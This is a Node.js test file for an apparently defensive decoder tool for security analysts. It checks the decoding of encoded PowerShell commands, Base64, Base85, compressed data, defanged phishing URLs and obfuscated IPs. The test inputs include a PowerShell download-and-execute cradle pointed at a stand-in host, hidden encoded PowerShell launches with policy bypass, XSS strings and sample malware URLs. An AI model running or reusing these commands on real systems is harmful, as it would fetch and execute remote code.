// Run with:  node --test tests/decoder.test.js
const test = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('node:zlib');
const { decode } = require('../js/decoder.js');

const utf16b64 = (s) => Buffer.from(s, 'utf16le').toString('base64');
const utf8b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
const CMD = "IEX (New-Object Net.WebClient).DownloadString('http://example.test/a.ps1')";

/* ------------------------------------------------------------------ */
/* Base64 & PowerShell Tests                                          */
/* ------------------------------------------------------------------ */

test('PowerShell -EncodedCommand (UTF-16LE)', async () => {
  const r = await decode('powershell.exe -NoP -NonI -W Hidden -enc ' + utf16b64(CMD));
  assert.equal(r.ok, true);
  assert.equal(r.output, CMD);
  assert.equal(r.warnings.length, 0);
  assert.ok(r.steps.includes('UTF-16LE'));
});

test('placeholder example in the UI decodes', async () => {
  const r = await decode('powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoACcAaABlAGwAbABvACcAKQA=');
  assert.equal(r.output, "IEX ('hello')");
});

test('flag variants: -e, -EncodedCommand, /enc, en dash, quoted payload', async () => {
  for (const flag of ['-e', '-EncodedCommand', '/enc', '\u2013ec', '-ENCODEDCOMMAND']) {
    const r = await decode(`pwsh ${flag} "${utf16b64('whoami /all')}"`);
    assert.equal(r.output, 'whoami /all', flag);
  }
});

test('-ExecutionPolicy is not mistaken for -EncodedCommand', async () => {
  const r = await decode('powershell -ExecutionPolicy Bypass -enc ' + utf16b64('Get-Process'));
  assert.equal(r.output, 'Get-Process');
});

test('plain UTF-8 Base64', async () => {
  const r = await decode(utf8b64('Hello, security analyst! \u00e9\u00e8 \u2713'));
  assert.equal(r.output, 'Hello, security analyst! \u00e9\u00e8 \u2713');
  assert.equal(r.warnings.length, 0);
});

test('plain UTF-16LE Base64 without flag', async () => {
  const r = await decode(utf16b64(CMD));
  assert.equal(r.output, CMD);
});

test('non-Latin UTF-16LE with -enc hint', async () => {
  const s = '\u041f\u0440\u0438\u0432\u0435\u0442 \u043c\u0438\u0440';
  const r = await decode('powershell -enc ' + utf16b64(s));
  assert.equal(r.output, s);
});

test('spaces, line breaks, quotes and missing padding', async () => {
  const b64 = utf16b64(CMD).replace(/=+$/, '');
  const messy = '  "' + b64.slice(0, 20) + '\r\n ' + b64.slice(20, 50) + '\n\t' + b64.slice(50) + '"  ';
  const r = await decode(messy);
  assert.equal(r.output, CMD);
  assert.equal(r.warnings.length, 0);
  assert.ok(r.notes.some((n) => /padding/i.test(n)));
});

test('URL-safe Base64', async () => {
  const s = '??>>~~ subjects?';
  const b64 = utf8b64(s).replace(/\+/g, '-').replace(/\//g, '_');
  const r = await decode(b64);
  assert.equal(r.output, s);
});

test('FromBase64String extraction', async () => {
  const r = await decode(`$x=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${utf16b64('calc.exe')}'));iex $x`);
  assert.equal(r.output, 'calc.exe');
});

test('truncated input decodes partially with a warning', async () => {
  const b64 = utf16b64(CMD);
  const r = await decode(b64.slice(0, b64.length - 7));
  assert.equal(r.ok, true);
  assert.ok(r.warnings.length > 0);
  assert.ok(CMD.startsWith(r.output.replace(/\uFFFD$/, '')));
});

test('invalid characters are removed with a warning, never silently', async () => {
  const b64 = utf8b64('Get-ChildItem C:\\Users');
  const r = await decode(b64.slice(0, 8) + '!' + b64.slice(8));
  assert.equal(r.output, 'Get-ChildItem C:\\Users');
  assert.ok(r.warnings.some((w) => /invalid character/.test(w)));
});

test('non-Base64 text is rejected', async () => {
  const r = await decode('this is just a normal sentence, not base64 at all!!!');
  assert.equal(r.ok, false);
});

test('empty input', async () => {
  const r = await decode('   ');
  assert.equal(r.ok, false);
});

test('gzip-compressed payload', async () => {
  const b64 = zlib.gzipSync(Buffer.from(CMD)).toString('base64');
  const r = await decode(b64);
  assert.equal(r.output, CMD);
  assert.ok(r.steps.includes('Gzip decompressed'));
});

test('raw deflate payload (PowerShell DeflateStream)', async () => {
  const b64 = zlib.deflateRawSync(Buffer.from(CMD)).toString('base64');
  const r = await decode(b64);
  assert.equal(r.output, CMD);
});

test('truncated gzip gives partial output with warning', async () => {
  const big = CMD.repeat(200);
  const gz = zlib.gzipSync(Buffer.from(big));
  const r = await decode(gz.subarray(0, Math.floor(gz.length / 2)).toString('base64'));
  assert.ok(r.warnings.length > 0);
});

test('binary data shown as hex dump with warning', async () => {
  const bin = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0xb8, 0x01, 0x02]);
  const r = await decode(bin.toString('base64'));
  assert.match(r.output, /^00000000  4d 5a/);
  assert.ok(r.warnings.some((w) => /Windows executable/.test(w)));
});

test('decoded HTML/script is returned as plain text only', async () => {
  const s = '<script>alert(1)</script><img src=x onerror=alert(2)>';
  const r = await decode(utf8b64(s));
  assert.equal(r.output, s);
});

/* ------------------------------------------------------------------ */
/* Base85 Tests (Ascii85 & RFC 1924 / Python Base85)                  */
/* ------------------------------------------------------------------ */

test('Base85: Ascii85 with <~ ... ~> delimiters (auto & explicit)', async () => {
  // "Hello World" in Ascii85 is <~87cURD]i,"Ebo7~>
  const r = await decode('<~87cURD]i,"Ebo7~>');
  assert.equal(r.ok, true);
  assert.equal(r.output, 'Hello World');
  assert.equal(r.mode, 'base85');
});

test('Base85: Ascii85 without delimiters and with z zero-block shortcut', async () => {
  // "Hello World!" in Ascii85 is 87cURD]i,"Ebo80
  const r = await decode('87cURD]i,"Ebo80', 'base85');
  assert.equal(r.ok, true);
  assert.equal(r.output, 'Hello World!');
});

test('Base85: RFC 1924 / Python b85encode format', async () => {
  // "Hello World!" in RFC 1924 / Python b85encode is NM&qnZy;B1a%^NF
  const r = await decode('NM&qnZy;B1a%^NF', 'base85');
  assert.equal(r.ok, true);
  assert.equal(r.output, 'Hello World!');
  assert.ok(r.steps.some((s) => /RFC 1924/.test(s)));
});

test('Base85: Auto-detects raw Base85 with punctuation', async () => {
  const r = await decode('NM&qnZy;B1a%^NF');
  assert.equal(r.ok, true);
  assert.equal(r.output, 'Hello World!');
  assert.equal(r.mode, 'base85');
});

/* ------------------------------------------------------------------ */
/* URL / Obfuscated & Defanged URL Tests                              */
/* ------------------------------------------------------------------ */

test('URL: Defanged URL with hxxps, [:], [.], and percent encoding', async () => {
  const r = await decode('hxxps[:]//evil-login[.]example[.]com/auth%2Flogin%3Fuser%3Dadmin%2540corp.local');
  assert.equal(r.ok, true);
  assert.equal(r.mode, 'url');
  assert.equal(r.output, 'https://evil-login.example.com/auth/login?user=admin@corp.local');
  assert.ok(r.steps.includes('Re-fanged indicators'));
});

test('URL: Unwraps Outlook SafeLinks and decodes target', async () => {
  const safelink = 'https://nam01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fphish.example.org%2Freset%3Fid%3D42&data=05%7C01';
  const r = await decode(safelink);
  assert.equal(r.ok, true);
  assert.ok(r.output.startsWith('https://phish.example.org/reset?id=42'));
  assert.ok(r.steps.includes('Outlook SafeLinks unwrapped'));
});

test('URL: Unwraps Proofpoint URL Defense v2 and v3', async () => {
  const ppv2 = 'https://urldefense.proofpoint.com/v2/url?u=https-3A__malware.example.com_payload.exe&d=DwMFaQ';
  const r2 = await decode(ppv2);
  assert.equal(r2.ok, true);
  assert.equal(r2.output, 'https://malware.example.com/payload.exe');

  const ppv3 = 'https://urldefense.com/v3/__https://malware.example.com/drop.ps1__;!!AbCdEf!12345$';
  const r3 = await decode(ppv3);
  assert.equal(r3.ok, true);
  assert.equal(r3.output, 'https://malware.example.com/drop.ps1');
});

test('URL: De-obfuscates Hex, Decimal Dword, and Octal IPv4 hostnames', async () => {
  const rHex = await decode('http://0x7f000001:8080/shell');
  assert.equal(rHex.output, 'http://127.0.0.1:8080/shell');
  assert.ok(rHex.warnings.some((w) => /127\.0\.0\.1/.test(w)));

  const rDword = await decode('http://2130706433/admin');
  assert.equal(rDword.output, 'http://127.0.0.1/admin');

  const rOctal = await decode('http://0177.0.0.1/test');
  assert.equal(rOctal.output, 'http://127.0.0.1/test');
});

test('URL: Warns on "@" credential spoofing phishing trick', async () => {
  const r = await decode('https://login.microsoft.com@evil-attacker.test/signin', 'url');
  assert.equal(r.ok, true);
  assert.ok(r.warnings.some((w) => /Phishing "@" trick detected/.test(w)));
});

test('URL: Warns on shortened URLs with offline OPSEC note', async () => {
  const r = await decode('hxxps[:]//bit[.]ly/3xYzAbC');
  assert.equal(r.ok, true);
  assert.equal(r.output, 'https://bit.ly/3xYzAbC');
  assert.ok(r.warnings.some((w) => /Shortened URL detected/.test(w)));
});

/* ------------------------------------------------------------------ */
/* Hex & Escape Tests                                                 */
/* ------------------------------------------------------------------ */

test('Hex: Continuous and space-separated hex strings', async () => {
  const r1 = await decode('48 65 6c 6c 6f 20 53 4f 43');
  assert.equal(r1.ok, true);
  assert.equal(r1.mode, 'hex');
  assert.equal(r1.output, 'Hello SOC');

  const r2 = await decode('5472794861636b4d65');
  assert.equal(r2.ok, true);
  assert.equal(r2.mode, 'hex');
  assert.equal(r2.output, 'TryHackMe');
});

test('Hex: \\xNN and \\uNNNN escape sequences', async () => {
  const rHexEsc = await decode('\\x77\\x68\\x6f\\x61\\x6d\\x69');
  assert.equal(rHexEsc.ok, true);
  assert.equal(rHexEsc.output, 'whoami');

  const rUniEsc = await decode('\\u0050\\u006f\\u0077\\u0065\\u0072\\u0053\\u0068\\u0065\\u006c\\u006c');
  assert.equal(rUniEsc.ok, true);
  assert.equal(rUniEsc.output, 'PowerShell');
});
